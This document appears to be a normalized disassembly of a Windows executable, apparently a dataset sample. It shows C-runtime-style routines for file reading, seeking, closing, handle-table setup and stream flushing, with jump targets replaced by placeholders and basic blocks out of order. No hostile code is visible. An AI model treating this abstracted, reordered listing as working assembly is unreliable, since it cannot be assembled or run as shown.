mov ecx 0x1
mov eax [ ebx + 0x8 ]
call sub_41ab64
jmp r-xdata
sub_4139d0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x8 ]
mov ecx [ eax + 0x8 ]
xor ecx eax
call sub_40eb9e
push ebp
mov ebp [ eax + 0x18 ]
push [ eax + 0xc ]
push [ eax + 0x10 ]
push [ eax + 0x14 ]
call sub_413940
add esp 0xc
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_413a32
push ebp
push esi
push edi
push ebx
mov ebp edx
xor eax eax
xor ebx ebx
xor edx edx
xor esi esi
xor edi edi
call ecx
pop ebx
pop edi
pop esi
pop ebp
retn
sub_413a62
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0x0
push edx
push r-xdata
push ecx
call RtlUnwind
pop edi
pop esi
pop ebx
pop ebp
retn
sub_413a92
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_412060
mov [ eax ] 0x16
call sub_412224
or eax 0xffffffff
pop ebp
retn
sub_413ab6
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_413afc
pop ecx
test eax eax
je r-xdata
push esi
call sub_413b69
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_413a92
push eax
call sub_41af2d
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_413afc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov eax [ esi + 0xc ]
and al 0x3
cmp al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] ecx
pop esi
mov eax ebx
pop ebx
pop ebp
retn
test [ esi + 0xc ] 0x108
je r-xdata
push edi
mov edi [ esi ]
sub edi [ esi + 0x8 ]
test edi edi
jle r-xdata
pop edi
push edi
push [ esi + 0x8 ]
push esi
call sub_413a92
pop ecx
push eax
call sub_414d00
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_413b69
push 0x14
push r--data
call sub_411bb0
xor edi edi
mov [ ebp - 0x1c ] edi
and [ ebp - 0x24 ] edi
push 0x1
call sub_416df0
pop ecx
and [ ebp - 0x4 ] edi
xor esi esi
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413c44
cmp ebx 0x1
mov eax edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
call sub_411bf5
retn
mov eax [ ebp - 0x24 ]
inc esi
jmp r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov [ ebp - 0x20 ] esi
cmp esi [ rw-data ]
jge r-xdata
push eax
push esi
call sub_4134e6
pop ecx
pop ecx
mov [ ebp - 0x4 ] 0x1
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test [ eax + 0xc ] 0x83
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_413c11
cmp ebx 0x1
jne r-xdata
test ebx ebx
jne r-xdata
push eax
call sub_413ab6
pop ecx
cmp eax 0xffffffff
je r-xdata
test [ eax + 0xc ] 0x2
je r-xdata
inc edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
push eax
call sub_413ab6
pop ecx
cmp eax 0xffffffff
jne r-xdata
or [ ebp - 0x24 ] eax
sub_413c4d
push 0x18
push r--data
call sub_411bb0
or esi 0xffffffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] esi
mov edi [ ebp + 0x8 ]
cmp edi 0xfffffffe
jne r-xdata
test edi edi
js r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
call sub_412224
cmp edi [ rw-data ]
jae r-xdata
mov edx esi
mov eax edi
sar eax 0x5
mov [ ebp - 0x1c ] eax
mov ebx edi
and ebx 0x1f
shl ebx 0x6
mov eax [ eax * 4 + rw-data ]
movsx eax [ eax + ebx + 0x4 ]
and eax 0x1
je r-xdata
push edi
call sub_41ab67
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x1c ]
mov eax [ eax * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x1
je r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_41202c
and [ eax ] 0x0
mov ebx esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_413d49
add esp 0x10
mov esi eax
mov ebx edx
jmp r-xdata
mov eax esi
call sub_411bf5
retn
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413d1f
mov edx ebx
jmp r-xdata
sub_413d49
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
push edi
push esi
call sub_41ae1e
or edi 0xffffffff
pop ecx
cmp eax edi
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x8 ]
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ SetFilePointerEx@IAT ]
test eax eax
jne r-xdata
call sub_412060
mov [ eax ] 0x9
mov eax esi
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
shl esi 0x6
and [ eax + esi + 0x4 ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call [ GetLastError@IAT ]
push eax
call sub_41203f
pop ecx
jmp r-xdata
pop edi
pop esi
leave
retn
mov eax edi
mov edx edi
jmp r-xdata
sub_413dc0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_413deb
push 0x10
push r--data
call sub_411bb0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
mov eax 0x7fffffff
cmp eax [ ebp + 0x10 ]
sbb eax eax
inc eax
jne r-xdata
push esi
call sub_41ab67
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x16
jmp r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_41202c
and [ eax ] 0x0
or edi 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_413ef3
add esp 0xc
mov edi eax
jmp r-xdata
call sub_412224
call sub_411bf5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_413eca
mov eax edi
jmp r-xdata
sub_413ef3
push ebp
mov ebp esp
sub esp 0x28
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0xfffffffe
pop ecx
xor edi edi
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x28 ] esi
cmp eax ecx
jne r-xdata
test eax eax
js r-xdata
call sub_41202c
mov [ eax ] edi
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_41202c
mov [ eax ] edi
call sub_412060
mov [ eax ] 0x9
cmp eax [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ecx eax
sar ecx 0x5
mov ebx eax
mov edx [ ecx * 4 + rw-data ]
and ebx 0x1f
shl ebx 0x6
mov [ ebp - 0xc ] ecx
mov al [ edx + ebx + 0x4 ]
mov [ ebp - 0x24 ] ebx
test al 0x1
je r-xdata
cmp esi 0x7fffffff
jbe r-xdata
test esi esi
je r-xdata
call sub_41202c
mov [ eax ] edi
xor eax eax
jmp r-xdata
test al 0x2
jne r-xdata
call sub_412224
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] edi
jne r-xdata
mov al [ edx + ebx + 0x24 ]
add al al
sar al 0x1
mov [ ebp + 0x13 ] al
movsx eax al
dec eax
je r-xdata
call sub_41202c
and [ eax ] edi
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
dec eax
jne r-xdata
call sub_412060
mov [ eax ] 0x16
jmp r-xdata
shr esi 0x1
cmp esi 0x4
jae r-xdata
mov eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax esi
not eax
test al 0x1
je r-xdata
push esi
call sub_411b1b
pop ecx
mov [ ebp - 0x10 ] eax
test eax eax
jne r-xdata
push 0x4
pop esi
mov edx [ ecx * 4 + rw-data ]
mov ecx [ ebp - 0xc ]
test [ edx + ebx + 0x4 ] 0x48
mov [ ebp - 0x1c ] eax
je r-xdata
and esi 0xfffffffe
push 0x1
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_413d49
mov ecx [ ebp - 0xc ]
add esp 0x10
mov ecx [ ecx * 4 + rw-data ]
mov [ ecx + ebx + 0x28 ] eax
mov eax [ ebp - 0x10 ]
mov [ ecx + ebx + 0x2c ] edx
mov ecx [ ebp - 0xc ]
call sub_412060
mov [ eax ] 0xc
call sub_41202c
mov [ eax ] 0x8
jmp r-xdata
push [ ebp + 0x8 ]
call sub_418c80
test eax eax
mov eax [ ebp - 0xc ]
pop ecx
je r-xdata
mov dl [ edx + ebx + 0x5 ]
cmp dl 0xa
je r-xdata
mov eax [ eax * 4 + rw-data ]
push 0x0
lea ecx [ ebp - 0x14 ]
push ecx
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x80
je r-xdata
test esi esi
je r-xdata
call [ GetLastError@IAT ]
push 0x5
pop esi
cmp eax esi
jne r-xdata
mov ecx [ ebp - 0x14 ]
test ecx ecx
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push [ ecx + ebx ]
call [ GetConsoleMode@IAT ]
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ eax ] dl
xor edi edi
lea edx [ eax + 0x1 ]
mov eax [ ecx * 4 + rw-data ]
inc edi
dec esi
cmp [ ebp + 0x13 ] 0x0
mov [ ebp - 0x1c ] edx
mov [ eax + ebx + 0x5 ] 0xa
je r-xdata
cmp eax 0x6d
jne r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_41202c
mov [ eax ] esi
jmp r-xdata
cmp ecx esi
ja r-xdata
mov eax [ ebp - 0xc ]
cmp [ ebp + 0x13 ] 0x2
jne r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x25 ]
cmp al 0xa
je r-xdata
push eax
call sub_41203f
pop ecx
xor ebx ebx
jmp r-xdata
or ebx 0xffffffff
mov edx [ ebp - 0xc ]
add edi ecx
mov esi [ edx * 4 + rw-data ]
mov al [ esi + ebx + 0x4 ]
test al al
jns r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
shr esi 0x1
mov eax [ eax * 4 + rw-data ]
push esi
push [ ebp - 0x1c ]
push [ eax + ebx ]
call [ ReadConsoleW@IAT ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x10 ]
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ ebp + 0x13 ] 0x2
je r-xdata
mov eax [ ebp - 0x14 ]
lea ecx [ eax + eax ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
call [ GetLastError@IAT ]
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
inc edx
push 0x2
dec esi
cmp [ ebp + 0x13 ] 0x1
mov [ ebp - 0x1c ] edx
pop edi
mov [ eax + ebx + 0x25 ] 0xa
jne r-xdata
cmp ebx 0xfffffffe
je r-xdata
push eax
call sub_40f402
pop ecx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
test ecx ecx
je r-xdata
mov eax [ ecx * 4 + rw-data ]
mov al [ eax + ebx + 0x26 ]
cmp al 0xa
je r-xdata
mov eax edi
jmp r-xdata
mov edi ebx
test ecx ecx
je r-xdata
mov esi [ ebp - 0x10 ]
mov eax edi
cdq
sub eax edx
sar eax 0x1
mov edi esi
mov ecx esi
lea edx [ edi + eax * 2 ]
cmp edi edx
jae r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
cmp [ ecx ] 0xa
jne r-xdata
test esi esi
je r-xdata
and al 0xfb
mov ecx [ ebp - 0x10 ]
push 0xa
pop edx
cmp [ ecx ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
and edi 0xfffffffe
jmp r-xdata
push 0xd
mov [ ebp + 0x10 ] 0x1a
pop edi
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
cmp [ ebp + 0x13 ] 0x1
jne r-xdata
push 0xd
pop ecx
mov edi eax
or al 0x4
jmp r-xdata
push 0x3
pop edi
mov [ edx ] al
mov eax [ ecx * 4 + rw-data ]
push 0xa
inc edx
pop ecx
mov [ ebp - 0x1c ] edx
dec esi
mov [ eax + ebx + 0x26 ] cl
mov eax [ ebp - 0x10 ]
mov edi esi
sub edi eax
jmp r-xdata
push 0xd
pop ecx
mov [ ebp + 0x10 ] 0x1a
mov edi eax
or al 0x4
jmp r-xdata
mov ebx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov eax [ eax * 4 + rw-data ]
or [ eax + ebx + 0x4 ] 0x2
cmp ax di
je r-xdata
test edi edi
je r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp al cl
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] ecx
cmp eax ecx
jae r-xdata
mov ecx [ edx * 4 + rw-data ]
mov al [ ecx + ebx + 0x4 ]
test al 0x40
jne r-xdata
cmp ax cx
je r-xdata
mov [ esi + ebx + 0x4 ] al
mov eax [ ebp - 0x10 ]
mov esi eax
lea ecx [ eax + edi ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] ecx
cmp eax ecx
jae r-xdata
lea eax [ edx - 0x2 ]
cmp ecx eax
jae r-xdata
mov [ esi ] ax
add esi 0x2
add ecx 0x2
jmp r-xdata
dec esi
mov al [ esi ]
test al al
js r-xdata
mov al [ edi ]
mov [ esi ] al
inc esi
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
dec eax
cmp edi eax
jae r-xdata
mov [ esi ] al
inc esi
inc edi
jmp r-xdata
mov ax [ edi ]
mov [ esi ] ax
add esi 0x2
or al 0x2
mov [ ecx + ebx + 0x4 ] al
jmp r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xfffffffe
cmp edi eax
jae r-xdata
mov [ esi ] ax
jmp r-xdata
cmp ecx edx
jb r-xdata
push 0xa
add ecx 0x2
pop eax
cmp [ ecx ] ax
je r-xdata
movzx eax al
xor edx edx
inc edx
cmp [ eax + rw-data ] 0x0
jne r-xdata
inc esi
jmp r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x1
lea eax [ ebp - 0x1 ]
push eax
mov eax [ edx * 4 + rw-data ]
inc edi
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0xa
jne r-xdata
cmp edi [ ebp - 0x1c ]
jb r-xdata
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x2
lea eax [ ebp - 0x8 ]
push eax
mov eax [ edx * 4 + rw-data ]
add edi 0x2
push [ eax + ebx ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push 0xa
pop edx
cmp [ edi + 0x2 ] dx
mov edx [ ebp - 0xc ]
jne r-xdata
add esi 0x2
add edi 0x2
jmp r-xdata
movzx eax [ ecx ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov [ esi ] ax
add esi 0x2
push 0xd
pop eax
push eax
pop edi
movzx eax [ esi ]
movsx eax [ eax + rw-data ]
test eax eax
jne r-xdata
mov ebx [ ebp - 0x10 ]
mov eax [ ebp - 0x28 ]
mov edi [ ebp - 0x10 ]
shr eax 0x1
push eax
push [ ebp + 0xc ]
sub esi edi
push esi
push edi
push 0x0
push 0xfde9
call [ MultiByteToWideChar@IAT ]
mov edi eax
test edi edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cl
inc esi
mov edi eax
jmp r-xdata
push 0xa
pop eax
add edi 0x2
mov [ esi ] al
jmp r-xdata
mov al [ edi ]
cmp al 0x1a
je r-xdata
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call [ GetLastError@IAT ]
test eax eax
jne r-xdata
mov [ esi ] cx
push 0xa
pop eax
add edi 0x4
mov [ esi ] ax
jmp r-xdata
cmp edi [ ebp - 0x20 ]
jb r-xdata
inc eax
cmp eax edx
jne r-xdata
call sub_412060
mov [ eax ] 0x2a
jmp r-xdata
mov ebx [ ebp - 0x24 ]
cmp esi ebx
jb r-xdata
mov eax [ ebp - 0xc ]
xor ecx ecx
mov eax [ eax * 4 + rw-data ]
cmp edi esi
setne cl
add edi edi
mov [ eax + ebx + 0x30 ] ecx
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cl
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
inc esi
jmp r-xdata
mov edx [ ebp - 0xc ]
push 0xd
pop ecx
mov [ esi ] cx
add esi 0x2
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ edx * 4 + rw-data ]
test [ eax + ebx + 0x4 ] 0x48
je r-xdata
add esi 0x2
jmp r-xdata
movzx eax [ edi ]
cmp ax [ ebp + 0x10 ]
je r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax * 4 + rw-data ]
test [ ecx + ebx + 0x4 ] 0x48
je r-xdata
add esi edx
jmp r-xdata
dec esi
inc edx
movzx eax [ esi ]
cmp [ eax + rw-data ] 0x0
je r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x1 ] al
jne r-xdata
cmp esi [ ebp - 0x10 ]
jne r-xdata
push 0xa
pop eax
push 0xd
cmp [ ebp - 0x8 ] ax
jne r-xdata
neg edx
mov eax edx
cdq
push 0x1
push edx
push eax
push [ ebp + 0x8 ]
call sub_413d49
add esp 0x10
mov al [ esi ]
inc esi
mov [ ecx + ebx + 0x5 ] al
mov eax [ ebp - 0xc ]
cmp edx 0x2
jl r-xdata
cmp edx 0x4
jg r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push [ ebp + 0x8 ]
call sub_413d49
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x1 ] al
jne r-xdata
mov [ esi ] 0xd
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x1 ]
inc esi
mov [ ecx + ebx + 0x5 ] al
jmp r-xdata
mov [ esi ] al
inc esi
jmp r-xdata
push 0x1
push 0xffffffff
push 0xfffffffe
push [ ebp + 0x8 ]
call sub_413d49
mov edx [ ebp - 0xc ]
add esp 0x10
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
je r-xdata
push 0xa
pop eax
cmp [ ebp - 0x8 ] ax
jne r-xdata
pop eax
mov [ esi ] ax
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x8 ]
mov [ ecx + ebx + 0x5 ] al
mov ecx [ edx * 4 + rw-data ]
mov al [ ebp - 0x7 ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ edx * 4 + rw-data ]
push 0xa
pop ecx
add esi 0x2
mov [ eax + ebx + 0x26 ] cl
mov [ esi ] ax
add esi 0x2
jmp r-xdata
cmp edx 0x3
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x25 ] al
mov eax [ ebp - 0xc ]
inc esi
push 0xd
push 0xd
pop ecx
mov [ esi ] cl
mov [ esi ] al
inc esi
pop ecx
push 0xd
push 0xd
pop ecx
mov [ esi ] cx
mov [ esi ] ax
add esi 0x2
jmp r-xdata
pop ecx
sub esi edx
jmp r-xdata
mov ecx [ eax * 4 + rw-data ]
mov al [ esi ]
mov [ ecx + ebx + 0x26 ] al
inc esi
sub_414682
push 0x64
push r--data
call sub_411bb0
push 0xb
call sub_416df0
pop ecx
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x40
push 0x20
pop edi
push edi
call sub_411ad1
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
mov [ rw-data ] eax
mov [ rw-data ] edi
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_413940
add esp 0xc
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x74 ]
push eax
call [ GetStartupInfoW@IAT ]
cmp [ ebp - 0x42 ] 0x0
je r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov al [ ecx + 0x24 ]
and al 0x7f
mov [ ecx + 0x24 ] al
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
mov eax [ rw-data ]
jmp r-xdata
call sub_411bf5
retn
mov [ ebp - 0x2c ] ebx
cmp ebx 0x3
jge r-xdata
mov eax [ ebp - 0x40 ]
test eax eax
je r-xdata
add eax 0x800
cmp ecx eax
jae r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_414927
xor eax eax
mov esi ebx
shl esi 0x6
add esi [ rw-data ]
mov [ ebp - 0x24 ] esi
cmp [ esi ] 0xffffffff
je r-xdata
mov ecx [ eax ]
mov [ ebp - 0x1c ] ecx
add eax 0x4
mov [ ebp - 0x28 ] eax
add eax ecx
mov [ ebp - 0x20 ] eax
mov eax 0x800
cmp ecx eax
jl r-xdata
mov [ esi + 0x4 ] 0x81
test ebx ebx
jne r-xdata
cmp [ esi ] 0xfffffffe
je r-xdata
xor esi esi
inc esi
mov [ ebp - 0x30 ] esi
mov ecx eax
mov [ ebp - 0x1c ] ecx
lea eax [ ebx - 0x1 ]
neg eax
sbb eax eax
add eax 0xfffffff5
push 0xfffffff6
pop eax
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x80
mov [ esi + 0x4 ] al
jmp r-xdata
mov edi ebx
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x20 ]
push 0x40
push edi
call sub_411ad1
pop ecx
pop ecx
mov ecx eax
mov [ ebp - 0x24 ] ecx
test ecx ecx
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
mov [ esi + 0x4 ] al
mov [ esi ] 0xfffffffe
mov eax [ rw-data ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push eax
call [ GetStdHandle@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
inc ebx
jmp r-xdata
mov esi [ edx ]
cmp esi 0xffffffff
je r-xdata
mov [ esi * 4 + rw-data ] ecx
add [ rw-data ] edi
mov ecx [ rw-data ]
mov [ ebp - 0x1c ] ecx
mov eax [ eax + ebx * 4 ]
mov [ eax + 0x10 ] 0xfffffffe
push edi
call [ GetFileType@IAT ]
test eax eax
je r-xdata
inc edi
mov [ ebp - 0x2c ] edi
mov eax [ ebp - 0x28 ]
inc eax
mov [ ebp - 0x28 ] eax
add edx 0x4
mov [ ebp - 0x20 ] edx
jmp r-xdata
cmp esi 0xfffffffe
je r-xdata
inc esi
mov [ ebp - 0x30 ] esi
mov ecx [ ebp - 0x1c ]
jmp r-xdata
mov [ ecx + 0x4 ] 0xa00
or [ ecx ] 0xffffffff
mov [ ecx + 0x8 ] ebx
and [ ecx + 0x24 ] 0x80
mov [ ecx + 0x25 ] 0xa0a
mov [ ecx + 0x38 ] ebx
mov [ ecx + 0x34 ] bl
add ecx 0x40
mov [ ebp - 0x24 ] ecx
jmp r-xdata
mov [ esi ] edi
and eax 0xff
cmp eax 0x2
jne r-xdata
cmp edi ecx
jge r-xdata
mov al [ eax ]
test al 0x1
je r-xdata
cmp [ rw-data ] ecx
jge r-xdata
mov eax [ esi * 4 + rw-data ]
add eax 0x800
cmp ecx eax
jae r-xdata
cmp eax 0x3
jne r-xdata
movsx eax [ esi + 0x4 ]
or al 0x40
jmp r-xdata
test al 0x8
jne r-xdata
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
jmp r-xdata
movsx eax [ esi + 0x4 ]
or al 0x8
mov [ esi + 0x4 ] al
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x24 ] esi
mov eax [ edx ]
mov [ esi ] eax
mov eax [ ebp - 0x28 ]
mov al [ eax ]
mov [ esi + 0x4 ] al
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_414930
push 0x10
push r--data
call sub_411bb0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_41202c
and [ eax ] 0x0
call sub_412060
mov [ eax ] 0x9
call sub_412224
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_41ab67
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_412060
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_4149fa
pop ecx
mov edi eax
jmp r-xdata
call sub_411bf5
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4149d1
mov eax edi
jmp r-xdata
sub_4149fa
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_41ae1e
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_41203f
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_41ae1e
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_41ae1e
push 0x1
mov esi eax
call sub_41ae1e
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_41ad98
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_414a94
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_40f402
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_414ac4
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
jne r-xdata
mov eax [ edi + 0xc ]
test al 0x83
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
jmp r-xdata
or eax 0xffffffff
test al 0x40
jne r-xdata
test al 0x2
je r-xdata
